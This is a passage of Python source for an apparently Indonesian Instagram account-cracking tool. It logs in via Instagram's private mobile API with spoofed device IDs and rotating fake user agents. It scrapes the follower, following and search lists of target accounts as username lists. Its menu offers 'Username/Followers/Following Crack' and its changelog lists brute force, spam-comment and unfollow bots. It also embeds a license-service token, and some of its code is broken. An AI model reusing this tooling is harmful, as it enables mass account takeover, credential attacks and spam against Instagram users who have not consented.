strain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'
	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()
	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]
	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')
	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data))
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.mentod()
			urut=[]
			luciku=[]
		#	urut.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{self.username}\n",title=f"{M2}• {K2}• {H2}•{P2} {P2}Data {H2}• {K2}• {M2}•",width=80,padding=(0,3),style=f"{color_table}"))
			prints(Panel(f"{P2}\t     𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝙳𝚊𝚝𝚊𝚗𝚐 {H2}{nama}{P2} 𝙳𝚒 𝚃𝚘𝚘𝚕𝚜 {M2}𝙻𝚞𝚌𝚒𝚟𝚎𝚛𝚇𝚙𝚕𝚘𝚒𝚝 ",width=80,style=f"{color_table}"))
			luciku.append(Panel(f"{P2}[{B2}01{P2}]. 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{B2}02{P2}]. 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{B2}03{P2}]. 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 {H2}𝙲𝚛𝚊𝚌𝚔 ",width=40,padding=(0,3),style=f"{color_table}"))
			luciku.append(Panel(f"{P2}[{B2}04{P2}]. 𝚁𝚎𝚜𝚞𝚕𝚝 {H2}𝙲𝚛𝚊𝚌𝚔 {K2}𝙲𝙷𝙴𝙲𝙺𝙿𝙾𝙸𝙽𝚃 \n{P2}[{B2}05{P2}]. 𝚁𝚎𝚜𝚞𝚕𝚝 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{M2}E{P2}]. {M2}𝙻𝚘𝚐𝙾𝚞𝚝",width=40,padding=(0,3),style=f"{color_table}"))
			self.tol.print(Columns(luciku))
	def BUG(self):
		jalan(f"㋛ Tunggu Sedang Proses Menuju WhatsApp Admin");time.sleep(5);os.system("xdg-open https://wa.me/+6283133662280?");time.sleep(5);exit()
	
	def mentod(self):
		for i in external:
			nama = i.split('|')[0]
			followers = i.split('|')[1]
			following = i.split('|')[2]
		try:
			ses=requests.Session()
			lisen=open('.lisen.txt','r').read().splitlines()
			met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisen).json()
			men = met['licenseKey']
			key = men['key'][0:16]
			tahun = men['expires'][0:4]
			buln = men['expires'][5:7]
			tanggal=men['expires'][8:10]
			bulan = bulan_ttl[buln]
			tahun1 = men['created'][0:4]
			buln1 = men['created'][5:7]
			tanggal1 = men['created'][8:10]
			bulan1=bulan_ttl[buln1]
			#urut.append(Panel(f"{P2}Pengikut : {followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			#self.tol.print(Columns(urut))
		except:
			key = ""
			tanggal = ""
			bulan = ""
			tahun = ""
			tanggal1= ""
			bulan1 = ""
			tahun1 = ""
			luci=[]
			urut=[]
			luci.append(Panel(f"{P2}𝙽𝚊𝚖𝚎      : {H2}{nama}\n{P2}𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎  : {H2}{self.username}\n{P2}𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {H2}{followers}\n{P2}𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {H2}{following}",title=f"{K2}×͜× {M2}𝙿𝙴𝙽𝙶{P2}𝙶𝚄𝙽𝙰 {K2}×͜×",width=40,padding=(0,3),style=f"{color_table}"))
			luci.append(Panel(f"{P2}𝙹𝚘𝚒𝚗      : {H2}{day}\n{P2}𝙽𝚊𝚖𝚎𝚝𝚘𝚘𝚕  : {H2}Instagram\n{P2}𝙻𝚒𝚜𝚎𝚗𝚜𝚒   : {H2}Online\n{P2}𝙺𝚎𝚢.      : {H2} -",title=f"{K2}×͜× {M2}𝙻𝙸𝚂{P2}𝙴𝙽𝚂𝙸 {K2}×͜×",width=40,padding=(0,3),style=f"{color_table}"))
			self.tol.print(Columns(luci))
			#urut.append(Panel(f"{P2}Pengikut : {P2}{followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			self.tol.print(Columns(urut))
	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))
		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))
		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()
	def Exit(self):
		prints(Panel(f"[white]Apakah anda yakin ingin keluar ?",width=50,padding=(0,4),style=f"{color_table}"))
		x=input(f'{N}• Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan(f'• Berhasil Keluar Silakan Ketik Ulang Perintah Scriptnya');time.sleep(2);exit()
		elif x in ('t','T'):
			jalan(f'• Kembali Ke Menu Utama Tubg');time.sleep(5);self.menu()
		else:
			self.menu()
	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={six_id}&rrank_token=0.35875757839675004&include_reel=true"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid
	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=uuid.uuid4()
		guid=uuid.uuid4().hex[:32]
		xx=self.s.get(f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={guid}').cookies['csrftoken']
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': xx})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			str(uuid.uuid4()),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write(f"\r{H}•{N} Sedang Mengumpulkan {H}{len(internal)} {N}Useraname Search {H}{nama}{N}")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}[!] Koneksi internet bermasala;h{C}')
		except (KeyError, UnboundLocalError):
				exit(f"{N}[{M}!{N}] gagal mengambil username, kemungkinan username tidaklah publik")
		except KeyboardInterrupt:
				pass
		return internal
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[!] Cookie checkpoint{N}")
			except Exception as e:
				exit(f"{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:register_device()
	def infoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r•{N} Sedang mengumpulkan {O}{len(internal)} {N}useraname dari {O}{user}{N}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
	def ifoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r•{N} Sedang mengumpulkan {O}{len(internal)} {N}useraname dari {O}{user}{N}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasala;h{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
		
	def ua_sam(self):
		rr=random.randint
		rc=random.choice
		samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
		real,me = random.choice(samsung).split('|')
		com=rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10","24/7.0","21/5.0",'26/8.0.0'])
		versi=rc(igve)
		return (f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; samsung; {real}; {me}; {com}; {comi})")
		
	def ua_igeh(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.